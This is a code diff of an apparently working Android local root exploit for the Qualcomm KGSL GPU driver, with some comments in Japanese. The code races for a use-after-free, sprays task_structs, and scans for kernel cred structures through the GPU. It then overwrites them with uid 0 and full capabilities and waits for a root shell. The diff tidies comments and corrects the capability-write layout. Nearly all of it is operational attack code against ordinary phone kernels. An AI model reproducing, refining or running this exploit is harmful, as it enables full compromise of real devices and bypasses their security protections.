@@ -71,17 +71,16 @@ struct kgsl_cmdstream_readtimestamp_ctxtid { unsigned int context_id, type, time
 #define KGSL_TIMESTAMP_RETIRED 0x00000002
 
 #define UAF_ADDR  0x7001ff000ULL
-#define UAF_SIZE  0x10004000ULL          // 16MB+16KB
+#define UAF_SIZE  0x10004000ULL
 #define OVERLAP_ADDR 0x7001fe000ULL
 #define OVERLAP_SIZE 0x7000ULL
 #define BOGUS_ADDR 0x700204000ULL
 #define BOGUS_SIZE 0xffffffffffefd000ULL
-#define PLACEHOLDER_ADDR 0x710204000ULL   // UAF終端直後
-#define PLACEHOLDER_SIZE 0x10400000ULL    // 16MB+256KB
+#define PLACEHOLDER_ADDR 0x710204000ULL
+#define PLACEHOLDER_SIZE 0x10400000ULL
 
-// vmlinux symbols (pre-KASLR) – スナドラ855用（ログから決定）
 #define VMLINUX_TEXT      0xffffffc010080000ULL
-#define VMLINUX_INIT_CRED 0xffffffc012D97D08ULL   // ログの init_cred=0xFFFFFF986FD97D08 から逆算
+#define VMLINUX_INIT_CRED 0xffffffc012D97D08ULL
 #define VMLINUX_SELINUX_STATE 0xffffffc0123a4000ULL
 #define VMLINUX_SELINUX_ENFORCING_BOOT 0xffffffc01240744cULL
 
@@ -272,12 +271,10 @@ int main(int argc, char **argv) {
     if (kgsl_fd < 0) die("open kgsl");
     printf("[+] kgsl fd=%d\n", kgsl_fd);
 
-    // Detect KASLR
     printf("[*] Phase 0: Early KASLR detection\n");
     uint64_t init_cred_addr = detect_kaslr();
     printf("  init_cred=0x%lX\n", init_cred_addr);
 
-    // ===== Phase 1: Setup rbtree =====
     printf("[*] Phase 1: Setup rbtree\n");
     uint64_t alloc_flags = KGSL_MEMFLAGS_USE_CPU_MAP | KGSL_CACHEMODE_WRITEBACK;
     printf("  Using alloc_flags=0x%lx (WRITEBACK cache mode)\n", (unsigned long)alloc_flags);
@@ -298,7 +295,6 @@ int main(int argc, char **argv) {
         (unsigned long)UAF_ADDR, (unsigned long)BOGUS_ADDR,
         (unsigned long)PLACEHOLDER_ADDR);
 
-    // ===== Phase 2: Race =====
     printf("[*] Phase 2: Race\n");
     int ov_id = gpuobj_alloc(kgsl_fd, OVERLAP_SIZE, alloc_flags);
 
@@ -321,13 +317,11 @@ int main(int argc, char **argv) {
     if (!hit) { printf("[-] Race failed\n"); close(kgsl_fd); return 1; }
     printf("[+] Race won! (errno=ENODEV)\n");
 
-    // ===== Phase 3: Free UAF =====
     printf("[*] Phase 3: Free UAF\n");
     gpuobj_free(kgsl_fd, uaf_id);
     printf("[+] UAF freed (dangling PTEs at 0x%lx+)\n",
         (unsigned long)(UAF_ADDR + 0x1000));
 
-    // ===== Phase 4: Reclaim =====
     printf("[*] Phase 4: Reclaim pages\n");
     int rf = open("/proc/sys/vm/compact_memory", O_WRONLY);
     if (rf >= 0) { write(rf, "1", 1); close(rf); }
@@ -335,7 +329,6 @@ int main(int argc, char **argv) {
     if (rf >= 0) { write(rf, "3", 1); close(rf); }
     usleep(10000);
 
-    // ===== Phase 5: Spawn task_struct spray =====
     printf("[*] Phase 5: Spawning task_struct spray...\n");
     int notify_pipe[2];
     if (pipe(notify_pipe) < 0) die("pipe");
@@ -352,12 +345,9 @@ int main(int argc, char **argv) {
             for (int j = 0; j < 1800; j++) {
                 usleep(200000);
                 if (getuid() == 0) {
-                    // Root achieved – notify parent
                     usleep(50000);
                     pid_t me = getpid();
-                    // Write to pipe, check for success
                     if (write(notify_pipe[1], &me, sizeof(me)) != sizeof(me)) {
-                        // Fallback: create a file
                         int fd = open("/data/local/tmp/rooted", O_CREAT|O_WRONLY, 0666);
                         if (fd >= 0) { write(fd, "1", 1); close(fd); }
                     }
@@ -365,7 +355,6 @@ int main(int argc, char **argv) {
                     close(notify_pipe[1]);
                     usleep(50000);
                     char buf[4096]; int n;
-                    // SELinux context
                     int fd = open("/proc/self/attr/current", O_RDONLY);
                     if (fd >= 0) {
                         write(1, "  SELinux: ", 11);
@@ -373,7 +362,6 @@ int main(int argc, char **argv) {
                         write(1, "\n", 1);
                         close(fd);
                     }
-                    // seccomp
                     int sec = prctl(PR_GET_SECCOMP, 0, 0, 0, 0);
                     write(1, "  Seccomp: ", 11);
                     char ebuf[32]; int elen = snprintf(ebuf, sizeof(ebuf), "%d\n", sec);
@@ -421,7 +409,6 @@ int main(int argc, char **argv) {
     close(notify_pipe[1]);
     printf("  Spawned %d children\n", n_spray);
 
-    // ===== Phase 7: GPU scan =====
     printf("[*] Phase 7: GPU scan for task_structs\n");
     unsigned int ctx_id = create_context(kgsl_fd);
     printf("  context=%u\n", ctx_id);
@@ -569,7 +556,6 @@ int main(int argc, char **argv) {
         }
     }
 
-    // ===== Phase 7e: Test GPU read from kernel VA =====
     uint64_t inc_sec = 0;
     {
         printf("[*] Phase 7e: Testing GPU read from kernel VA (init_cred)\n");
@@ -606,7 +592,6 @@ int main(int argc, char **argv) {
         }
     }
 
-    // ===== Phase 7b: GPU→CPU coherency verification =====
     printf("[*] Phase 7b: GPU→CPU coherency via DST buffer\n");
     {
         uint32_t *cmd = (uint32_t*)ib_m;
@@ -639,7 +624,7 @@ int main(int argc, char **argv) {
         }
     }
 
-    // ===== Phase 8b: Direct cred overwrite =====
+    // ===== Phase 8b: Direct cred overwrite (修正版) =====
     if (n_cred > 0) {
         printf("[*] Phase 8b: Writing uid=0 + full caps to %d cred pages\n", n_cred);
         int n_ok = 0;
@@ -682,21 +667,36 @@ int main(int argc, char **argv) {
                 cmd[dw++] = zl; cmd[dw++] = zh;
             }
 
-            // Write uid=0 and full caps (0x3ffffffff for each)
+            // ===== 修正: 正しい順序で Capability を書き込む =====
+            // オフセット 0x04 から 19 ワード (76バイト) を書き込む
             memset(ib_m, 0, 0x10000);
             dw = 0;
             split64(cbase + 0x04, &zl, &zh);
-            cmd[dw++] = cp_type7(CP_MEM_WRITE, 21);
+            cmd[dw++] = cp_type7(CP_MEM_WRITE, 19);   // データ数 19
             cmd[dw++] = zl; cmd[dw++] = zh;
+
+            // usage～fsgid (8ワード) = 0
             for (int i = 0; i < 8; i++) cmd[dw++] = 0;
+
+            // securebits (0x24) = 0x00000004 (または0)
             cmd[dw++] = 0x00000004;
-            cmd[dw++] = 0; cmd[dw++] = 0;
-            // CapInh, CapPrm, CapEff を 0x3ffffffff (低32=0xFFFFFFFF, 高32=0x00000003) に設定
-            cmd[dw++] = 0xFFFFFFFF; cmd[dw++] = 0x00000003;   // CapInh
-            cmd[dw++] = 0xFFFFFFFF; cmd[dw++] = 0x00000003;   // CapPrm
-            cmd[dw++] = 0xFFFFFFFF; cmd[dw++] = 0x00000003;   // CapEff
-            cmd[dw++] = 0; cmd[dw++] = 0;
-            // Readback uid
+
+            // CapInh (0x28) = 0x00000003FFFFFFFF
+            cmd[dw++] = 0x00000003; cmd[dw++] = 0xFFFFFFFF;
+
+            // CapPrm (0x30) = 0x00000003FFFFFFFF
+            cmd[dw++] = 0x00000003; cmd[dw++] = 0xFFFFFFFF;
+
+            // CapEff (0x38) = 0x00000003FFFFFFFF
+            cmd[dw++] = 0x00000003; cmd[dw++] = 0xFFFFFFFF;
+
+            // CapBset (0x40) = 0x00000003FFFFFFFF
+            cmd[dw++] = 0x00000003; cmd[dw++] = 0xFFFFFFFF;
+
+            // CapAmbient (0x48) = 0x00000003FFFFFFFF
+            cmd[dw++] = 0x00000003; cmd[dw++] = 0xFFFFFFFF;
+
+            // Readback uid (0x04)
             memset(dst_m, 0, 0x1000);
             split64(dst_ga, &dl, &dh);
             split64(cbase + 0x04, &sl, &sh);
@@ -750,7 +750,6 @@ int main(int argc, char **argv) {
         }
     }
 
-    // ===== Phase 8d: Cache eviction =====
     printf("[*] Phase 8d: Cache eviction\n"); fflush(stdout);
     void *ev = mmap(0, 0x2000000, PROT_READ|PROT_WRITE,
         MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
@@ -761,33 +760,25 @@ int main(int argc, char **argv) {
     }
     sleep(1);
 
-    // ===== Phase 9: Wait for root shell =====
     printf("[*] Phase 9: Waiting for root shell...\n");
     printf("  parent uid=%u euid=%u\n", getuid(), geteuid());
     fflush(stdout);
 
     close(notify_pipe[1]);
-
-    // Give children a moment to write, then try non-blocking read
     sleep(1);
     struct pollfd pfd = { .fd = notify_pipe[0], .events = POLLIN };
     pid_t winner = 0;
-    // First attempt a non-blocking read
     ssize_t r = read(notify_pipe[0], &winner, sizeof(winner));
-    if (r == sizeof(winner)) {
-        // already have data
-    } else {
-        // Fallback to poll
+    if (r != sizeof(winner)) {
         if (poll(&pfd, 1, 10000) > 0 &&
             read(notify_pipe[0], &winner, sizeof(winner)) == sizeof(winner)) {
             // success
         } else {
-            // Check fallback file
             int fd = open("/data/local/tmp/rooted", O_RDONLY);
             if (fd >= 0) {
                 char c;
                 if (read(fd, &c, 1) == 1 && c == '1') {
-                    winner = 1; // dummy, we know root achieved
+                    winner = 1;
                 }
                 close(fd);
             }
